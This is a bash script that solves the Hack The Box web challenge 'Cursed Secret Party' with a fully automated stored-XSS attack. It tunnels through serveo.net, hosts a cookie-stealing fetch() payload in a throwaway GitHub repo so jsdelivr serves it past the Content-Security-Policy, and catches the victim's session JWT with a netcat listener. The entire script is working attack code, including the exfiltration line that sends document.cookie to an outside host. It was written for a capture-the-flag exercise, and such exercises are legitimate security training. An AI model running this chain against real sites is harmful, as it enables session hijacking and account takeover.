#!/bin/bash
# https://app.hackthebox.com/challenges/Cursed%2520Secret%2520Party
# Tags: Stored XSS, JS, Content-Security-Policy Bypass, cdn.jsdelivr.net, gh

TARGET=127.0.0.1:1337
PORT=4444

echo -e "[\u2714] Digging tunnel with serveo.net"
nohup ssh -R 80:localhost:$PORT serveo.net > serveo.log 2>&1 &
echo $! > serveo.pid
sleep 3
SERVER=$(grep -oP 'https://\K[a-zA-Z0-9]+\.serveo\.net' serveo.log)
echo -e "[\u2714] $SERVER:80 / 127.0.0.1:$PORT tunnel established"

REPO=$RANDOM$RANDOM
echo -e "[\u2714] Creating temporary GitHub [$REPO] repository"
gh repo create $REPO --public --clone > /dev/null 2>&1

echo -e "[\u2714] Pushing Content-Security-Policy bypass payload"
cd $REPO
echo "fetch('https://$SERVER?cookie=' + document.cookie);" > xss.js
git add xss.js > /dev/null 2>&1
git commit -m "feat: XSS for HTB Cursed Secret Party web challenge" > /dev/null 2>&1
git push --set-upstream origin master > /dev/null 2>&1

CSP_BYPASS_PAYLOAD=https://cdn.jsdelivr.net/gh/magicrc/$REPO/xss.js
echo -ne "[\u2714] Checking payload availability under [$CSP_BYPASS_PAYLOAD]..."
sleep 3
STATUS_CODE=$(curl -o /dev/null -s -w "%{http_code}" $CSP_BYPASS_PAYLOAD)
if [[ "$STATUS_CODE" -ne 200 ]]; then
    echo "Error: HTTP $STATUS_CODE"
    exit 1
fi
echo "OK"

cd ..
echo -e "[\u2714] Starting netcat based C2 to exfiltrate JWT"
nc -lvp $PORT > c2.log 2>/dev/null &

echo -e "[\u2714] Sending XSS payload to target"
XSS="<script src=https://cdn.jsdelivr.net/gh/magicrc/$REPO/xss.js></script>"
ENCODED_XSS=$(echo -n $XSS | jq -sRr @uri)
curl -s http://$TARGET/api/submit -d "halloween_name=$ENCODED_XSS&email=$RANDOM@server.com&costume_type=$RANDOM&trick_or_treat=treat" -o /dev/null
sleep 3

JWT=$(grep -oP '(?<=session=)[^ ]+' c2.log)
echo -e "[\u2714] Got JWT: $JWT"

echo -e "[\u2714] Cleaning up"
kill $(cat serveo.pid)
rm -fr serveo.pid serveo.log c2.log $REPO
gh repo delete $REPO --yes > /dev/null 2>&1

FLAG=$(echo "$JWT" | cut -d '.' -f2 | base64 -d | grep -oP 'HTB\{.*?\}')
echo -e "[\u2714] Flag captured: \e[1;37m$FLAG\e[0m"
